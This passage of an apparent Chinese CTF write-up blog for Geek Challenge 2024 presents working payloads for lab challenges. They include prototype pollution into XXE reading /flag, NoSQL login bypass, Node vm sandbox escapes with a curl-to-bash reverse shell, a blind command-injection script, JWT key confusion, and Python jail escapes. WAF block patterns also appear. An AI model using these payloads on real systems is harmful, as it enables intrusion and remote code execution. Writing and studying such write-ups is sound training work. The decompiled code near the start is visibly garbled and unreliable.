class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        is_admin = session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> is_admin:</span><br><span class="line">            user_tag = <span class="string">&#x27;Admin User&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_tag = <span class="string">&#x27;Normal User&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], user_tag, is_admin, **(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;is_admin&#x27;</span>))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">dashboard = app.route(<span class="string">&#x27;/dashboard&#x27;</span>)(dashboard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xml_parse</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_bytes = app.config[<span class="string">&#x27;xml_data&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        parser = etree.XMLParser(<span class="literal">True</span>, <span class="literal">True</span>, **(<span class="string">&#x27;load_dtd&#x27;</span>, <span class="string">&#x27;resolve_entities&#x27;</span>))</span><br><span class="line">        tree = etree.fromstring(xml_bytes, parser, **(<span class="string">&#x27;parser&#x27;</span>,))</span><br><span class="line">        result_xml = etree.tostring(tree, <span class="literal">True</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;pretty_print&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;xml_declaration&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> Response(result_xml, <span class="string">&#x27;application/xml&#x27;</span>, **(<span class="string">&#x27;mimetype&#x27;</span>,))</span><br><span class="line">        <span class="keyword">except</span> etree.XMLSyntaxError:</span><br><span class="line">            e = <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xml_parse = app.route(<span class="string">&#x27;/xml_parse&#x27;</span>)(xml_parse)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__class__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__init__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__globals__&#x27;</span>.encode()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_route</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&#x27;NONONO, Bad Hacker&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">                data = <span class="literal">None</span>.loads(request.data.decode())</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(data.values())):</span><br><span class="line">                    update(data, User)</span><br><span class="line">                    <span class="keyword">return</span> (jsonify(&#123;</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;更新成功&#x27;</span> &#125;), <span class="number">200</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">f&#x27;&#x27;&#x27;Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">                    e = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">del</span> e</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&#x27;No data provided&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update_route = app.route(<span class="string">&#x27;/update&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(update_route)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, <span class="literal">False</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>))</span><br></pre></td></tr></table></figure><p>存在xml_parse路由，和update函数。很明显我们要打原型链污染xml_data从而进行xxe。<br>黑名单采用unicode编码绕过<br>POC:</p><pre><code>&#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;app&quot;:&#123;                &quot;config&quot;:&#123;                    &quot;xml_data&quot;:&quot;                        &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;                        &lt;!DOCTYPE xxe [                        &lt;!ELEMENT name ANY &gt;                        &lt;!ENTITY admin SYSTEM &quot;/flag&quot; &gt;]&gt;                        &lt;user&gt;                        &lt;username&gt;&amp;admin;&lt;/username&gt;                        &lt;password&gt;123456&lt;/password&gt;                        &lt;/user&gt;                        &quot;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>用cyberchef的unicode escape编码<br>payload:</p><pre><code>&#123;    &quot;_\u005Finit__&quot;:&#123;        &quot;_\u005Fglobals__&quot;:&#123;            &quot;app&quot;:&#123;                &quot;config&quot;:&#123;                    &quot;xml_data&quot;:&quot;\u003C\u003F\u0078\u006D\u006C\u0020\u0076\u0065\u0072\u0073\u0069\u006F\u006E\u003D\u0022\u0031\u002E\u0030\u0022\u0020\u0065\u006E\u0063\u006F\u0064\u0069\u006E\u0067\u003D\u0022\u0075\u0074\u0066\u002D\u0038\u0022\u003F\u003E\u000A\u003C\u0021\u0044\u004F\u0043\u0054\u0059\u0050\u0045\u0020\u0078\u0078\u0065\u0020\u005B\u000A\u003C\u0021\u0045\u004C\u0045\u004D\u0045\u004E\u0054\u0020\u006E\u0061\u006D\u0065\u0020\u0041\u004E\u0059\u0020\u003E\u000A\u003C\u0021\u0045\u004E\u0054\u0049\u0054\u0059\u0020\u0061\u0064\u006D\u0069\u006E\u0020\u0053\u0059\u0053\u0054\u0045\u004D\u0020\u0022\u002F\u0066\u006C\u0061\u0067\u0022\u0020\u003E\u005D\u003E\u000A\u003C\u0075\u0073\u0065\u0072\u003E\u000A\u003C\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003E\u0026\u0061\u0064\u006D\u0069\u006E\u003B\u003C\u002F\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003E\u000A\u003C\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003E\u0031\u0032\u0033\u0034\u0035\u0036\u003C\u002F\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003E\u000A\u003C\u002F\u0075\u0073\u0065\u0072\u003E&quot;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>在update路由传参，并在xml_parse收到flag</p><h2 id="noSandbox（复现）">noSandbox（复现）</h2><p>SQL采用了MongoDB<br><a href="https://xz.aliyun.com/t/9908">https://xz.aliyun.com/t/9908</a><br>用Nosql的永真式注入绕过登录</p><pre><code>&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></pre><p>接下来给了execute路由执行js代码<br>考点是VM逃逸<br><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a><br>分析获得的app_part.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//泄露的代码执行和WAF部分代码,不能直接运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(find|ownKeys|fromCharCode|includes|\&#x27;|\&quot;|replace|fork|reverse|fs|process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function|env)/m</span>;</span><br><span class="line">    <span class="keyword">if</span> (code.<span class="title function_">match</span>(pattern)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WAF detected malicious code&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;WAF detected malicious code&#x27;</span>);</span><br><span class="line">        <span class="title function_">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/execute&#x27;</span>, upload.<span class="title function_">none</span>(), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing execution code credentials.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid token provided.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Received code for execution: <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">waf</span>(code,res);</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Executing code in sandbox context&#x27;</span>);</span><br><span class="line">        script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Code executed successfully. Result: <span class="subst">$&#123;sandbox.result || <span class="string">&#x27;No result returned.&#x27;</span>&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">json</span>(<span class="string">&#x27;Code executed successfully&#x27;</span> );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error executing code: <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">`Error: there&#x27;s no display back here,may be it executed successfully?`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用`${}`绕过黑名单，利用官方题解总结</p><pre><code>process `$&#123;`$&#123;`proce`&#125;ss`&#125;`prototype `$&#123;`$&#123;`prototyp`&#125;e`&#125;`get_process `$&#123;`$&#123;`get_pro`&#125;cess`&#125;`require `$&#123;`$&#123;`requir`&#125;e`&#125;`execSync `$&#123;`$&#123;`exe`&#125;cSync`&#125;`return process `$&#123;`$&#123;`return proc`&#125;ess`&#125;`constructor `$&#123;`$&#123;`constructo`&#125;r`&#125;`child_process `$&#123;`$&#123;`child_proces`&#125;s`&#125;`</code></pre><p>payload:</p><pre><code>throw new Proxy(&#123;&#125;, &#123;get: function()&#123;const cc = arguments.callee.caller;const p = (cc.constructor.constructor(`$&#123;`$&#123;`return proc`&#125;ess`&#125;`))();chi=p.mainModule.require(`$&#123;`$&#123;`child_proces`&#125;s`&#125;`);res=Reflect.get(chi,`$&#123;`$&#123;`exe`&#125;cSync`&#125;`)(`curl 8.155.17.250/m.sh | bash`);return res.toString();&#125;&#125;)</code></pre><p>直接反弹shell即可</p><h2 id="escapeSandbox-PLUS（复现）">escapeSandbox_PLUS（复现）</h2><p>这个是真弄不懂原理，先把payload放上来<br>Part1：</p><pre><code>username:ſycloverpassword:J1rrY</code></pre><p>Part2：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ses = requests.session()</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;connect.sid=s%3AfkMOAgnXVe1bL5LoJ2KnKe3sjwHIPlP4.m1w4YDm7xwFa5aytoMLXKOp%2BV30kp4JQCD7Ylz4ww0g&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://3000-fead7ddc-eb05-474f-9c78-ec5636d0eb66.challenge.ctfplus.cn/execute&quot;</span></span><br><span class="line">pos = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    strs = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;-&#125;_&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strs:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;code[]&quot;</span>: <span class="string">&quot;async function fn() &#123; (function stack() &#123; new Error().stack; stack(); &#125;)(); &#125; p = fn(); p.constructor = &#123; [Symbol.species]: class FakePromise &#123; constructor(executor) &#123; executor((x) =&gt; x, (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;sleep $(cat /flag| cut -c%s | tr %s 2)&#x27;); &#125;) &#125; &#125; &#125;; p.then();&quot;</span></span><br><span class="line">            % (<span class="built_in">str</span>(pos), i)</span><br><span class="line">        &#125;</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        req1 = ses.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="built_in">print</span>(req1.text)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="built_in">print</span>(i + <span class="built_in">str</span>(t2 - t1))</span><br><span class="line">        <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="ez-js（复现）">ez_js（复现）</h2><p>第一关js原型链污染</p><pre><code>&#123;&quot;username&quot;:&quot;Starven&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;__proto__&quot;:&#123;&quot;hasFlag&quot;:true&#125;&#125;</code></pre><p>第二关需要绕过逗号<br>用&amp;连接并用syc传参</p><pre><code>?syc=&#123;&quot;username&quot;:&quot;Starven&quot;&amp;syc=&quot;password&quot;:&quot;123456&quot;&amp;syc=&quot;hasFlag&quot;:true&#125;</code></pre><h2 id="jwt-pickle（复现）">jwt_pickle（复现）</h2><p><a href="https://github.com/nu11secur1ty/rsa_sign2n">https://github.com/nu11secur1ty/rsa_sign2n</a><br>docker环境配好</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwiaXNfYWRtaW4iOmZhbHNlfQ.jleYYWDC9AlFzuGZ6Gk7RkyBuHlF7QS97wPA_ycJBtNPa1_RGMa5nyOE0-yv_dto9WMSx_aJ4epZ69fjZ8ZD1le6Qoa9sRhRdzW8el6NterxfMWfsz35L651Y69I13xsjg8uGryEKPcKTa42VvtCxUICkflYBJL29hpNwVBPQtGYTUIyusr6OkLSNLRiF7GF4EEqiBKcXf69xpYoIBsIOjbaE-tVsbrbCVOwDOugyz5HRWAN9fqtlVzsla5rgXSzJeyudYqzGDcR7oXzRH4ApoP16MQ-Q4_q_363HVOpOzx20qGUxgLP6b3roC-PuNLUcJ_lyFYQlos6obLo22p1Og eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOmZhbHNlfQ.DZKzbWYUbQvzgnkXi3oem1dTUtunTNqFtNTXmJUKkWjUenZpZMXZ_z-8aIzvVocQlS9BRnzFe5rVqkgwlla7BQ_fxKMixMmLbtlJ3tTNYLI2C5GtB4MRoui8dtMZx0n2zM9e0NmTy-zs8yiuHA9odC6p-KRxSRVZyAtpCD4FtAl0pybgBaBgSdJnw7On7Gm5CqjtOXar9OPX2Xy5fTLGyzkGd0Xgrj8oGafI0R5c9AcTh_aagPNLqwQ8gdDPu3uVPQOfyYgL8tfxX7NlA1B5JO8VnrFGDPvuQzVSJZnANAGHIABl3jjAQHdG9Th9CWaOcp7Jxrkw_hYx7VZWS4980Q</span><br></pre></td></tr></table></figure><p>将出现的密钥一个个试，发现b305dd712d5d2378_65537_pkcs1.pem是我们求的公钥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/docker</span><br><span class="line">docker <span class="built_in">cp</span> 68a13c73d848:/app/ /tmp/docker/68a13c73d848</span><br></pre></td></tr></table></figure><p>注意python库的jwt最新版已经弃用了pem 格式的公钥做为 HS256 的密钥<br>需要注释掉 jwt/algorithms.py中的raise InvalidKeyError部分</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_key</span>(<span class="params">self, key: <span class="built_in">str</span> | <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key_bytes = force_bytes(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if is_pem_format(key_bytes) or is_ssh_key(key_bytes):</span></span><br><span class="line">    <span class="comment">#     raise InvalidKeyError(</span></span><br><span class="line">    <span class="comment">#         &quot;The specified key is an asymmetric key or x509 certificate and&quot;</span></span><br><span class="line">    <span class="comment">#         &quot; should not be used as an HMAC secret.&quot;</span></span><br><span class="line">    <span class="comment">#     )</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_bytes</span><br></pre></td></tr></table></figure><p><a href="http://xn--jwt-t33e261p.py">jwt签名.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">publicKey = <span class="built_in">open</span>(<span class="string">&quot;./b305dd712d5d2378_65537_pkcs1.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">token = <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICIxIiwgInBhc3N3b3JkIjogImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwgImlzX2FkbWluIjogZmFsc2UsICJleHAiOiAxNzMyNzY4MTc0fQ.bohRFPyPpuMxMIuCtShU63I7ms2w8ZcWgejI1BV2158&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    real = jwt.decode(token, publicKey, algorithms=[<span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(real)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    exit(e)</span><br><span class="line">ss = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;is_admin&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1732768174</span>,</span><br><span class="line">&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    ss,</span><br><span class="line">    publicKey,</span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>获取admin权限后然后就可以打pickle反弹shell了</p><h1 id="Misc">Misc</h1><h2 id="I-wanna-go-to-SYC">I_wanna_go_to_SYC</h2><p><a href="https://www.cnblogs.com/chrysanthemum/p/11986382.html#gallery-7">https://www.cnblogs.com/chrysanthemum/p/11986382.html#gallery-7</a><br>一开始没有发现save1，我是傻逼<br>根据这个payload把第三位加2就能直接到flag房<br><img src="/img/WP/geek2024/save1.png" alt=""><br><img src="/img/WP/geek2024/iwanna.png" alt=""></p><h2 id="Welcome-jail">Welcome_jail</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">22957</span>)</span><br><span class="line">cmd = <span class="string">&quot;cat /home/ctf/flag&quot;</span></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">    exp += <span class="string">&quot;chr(&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(i)) + <span class="string">&quot;)+&quot;</span></span><br><span class="line">exp = exp.rstrip(<span class="string">&quot;+&quot;</span>).encode()  <span class="comment"># 去掉最后多余的 &quot;+&quot;</span></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">b&quot;print([].__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](%b).read())&quot;</span></span><br><span class="line">    % exp</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br></pre></td></tr></table></figure><h2 id="cimbar">cimbar</h2><p><a href="https://github.com/sz3/cimbar">https://github.com/sz3/cimbar</a><br>搜cimbar看到原理和给的图很相像，点进去得到cimbar的加密方式<br><a href="https://github.com/sz3/libcimbar/blob/master/DETAILS.md">https://github.com/sz3/libcimbar/blob/master/DETAILS.md</a><br><img src="/img/WP/geek2024/cimbar.png" alt=""><br>照着上面输入就OK了</p><h2 id="ez-pcap-1">ez_pcap_1</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">strings flag.pcapng | grep <span class="string">&quot;SYC&#123;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/pcap.png" alt=""></p><h2 id="Truth-of-Word">Truth of Word</h2><p><img src="/img/WP/geek2024/word1.png" alt=""><br>flag1: SYC{W0rd_H@5<br><img src="/img/WP/geek2024/word2.png" alt=""><br>flag2: @_Ama1n9_<br>把.docu后缀改为.zip，发现藏有flag03.png<br><img src="/img/WP/geek2024/word3.png" alt=""><br>flag3: StrUCtu3e!}</p><h2 id="2024-geek-challenge-签到">2024 geek challenge! 签到</h2><p>签到</p><h2 id="doSomeMath">doSomeMath</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">white_List=[<span class="string">&quot;+&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;,&quot;</span>]</span><br><span class="line">flag=os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">if</span> os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>)!=<span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;SYC&#123;test&#125;&quot;</span></span><br><span class="line">banner=<span class="string">&#x27;&#x27;&#x27;     _      ____                       __  __       _   _</span></span><br><span class="line"><span class="string">  __| | ___/ ___|  ___  _ __ ___   ___|  \/  | __ _| |_| |__</span></span><br><span class="line"><span class="string"> / _` |/ _ \___ \ / _ \| &#x27;_ ` _ \ / _ \ |\/| |/ _` | __| &#x27;_ \\</span></span><br><span class="line"><span class="string">| (_| | (_) |__) | (_) | | | | | |  __/ |  | | (_| | |_| | | |</span></span><br><span class="line"><span class="string"> \__,_|\___/____/ \___/|_| |_| |_|\___|_|  |_|\__,_|\__|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        exit(<span class="string">&quot;Please input ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> white_List:</span><br><span class="line">            exit(<span class="string">&quot;hacker!!!!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please do this math problem&quot;</span>)</span><br><span class="line"><span class="comment">#9872</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">input</span>(<span class="string">&quot;99*100^60= &quot;</span>)</span><br><span class="line">        waf(result)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">99</span> * <span class="number">100</span> ^ <span class="number">60</span> == <span class="built_in">eval</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congradulation!!!!! Here is your reward: &quot;</span> + flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not right&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>().__ge__(())</code> 可以构造出1，意思是()是否大于等于()。<br>接下来只要构造出9872就好，注意eval有字符长度限制</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span 